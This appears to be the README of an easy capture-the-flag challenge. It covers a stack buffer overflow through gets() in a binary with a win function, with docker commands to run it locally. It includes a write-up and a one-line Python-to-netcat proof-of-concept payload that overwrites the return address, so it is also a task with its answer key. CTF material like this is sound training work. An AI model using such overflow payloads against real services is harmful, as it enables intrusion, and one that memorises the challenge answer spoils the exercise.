# flaginator30000

## Category
Exploit

## Estimated difficulty
Easy

## Description
It's a simple buffer overflow where it is just needed to return to a different function to get the flag.
It can be run with:
  sudo docker build -t flaginator30000 .
  sudo docker run -d -p "0.0.0.0:3334:9999" -h "flaginator30000" --name="flaginator30000" flaginator30000


## Scenario
This little software just want to be sure you are really an administrator. How can you prove it?
It can be found at the following IP on the port PORT.

## Write-up
By reversing the executable we can see it uses an unprotected call to gets with all buffer overflow protection.
We also can find a win function at address 0x08049236 that will read the flag.

We just have to find the correct offset to override the return pointer and access the win function using gdb for instance.

Knowing all of that, we can use the following exploit to recover the flag:
`python2 -c 'print "AAAAAAAAAAAAAAAAAAAABBBBBBBBCCCC" + "\x36\x92\x04\x08"'  | nc 127.0.0.1 3334`


## PoC script
```
python2 -c 'print "AAAAAAAAAAAAAAAAAAAABBBBBBBBCCCC" + "\x36\x92\x04\x08"'  | nc 127.0.0.1 3334
```
